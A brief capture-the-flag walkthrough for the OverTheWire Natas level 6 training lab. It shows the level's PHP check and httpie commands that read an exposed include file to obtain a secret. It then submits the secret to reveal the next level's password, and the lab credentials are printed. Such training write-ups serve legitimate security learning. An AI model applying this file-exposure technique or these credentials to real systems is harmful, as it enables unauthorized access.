Page has a link to its redacted source code, including the following PHP snippet:
```
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

First step is getting the secret:
```
http -a natas6:fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR http://natas6.natas.labs.overthewire.org/includes/secret.inc
```

Then we can submit the form data:
```
http -v --form -a natas6:fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR http://natas6.natas.labs.overthewire.org/ secret=FOEIUWGHFEEUHOFUOIU submit=
```

Password for the next level is `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`.
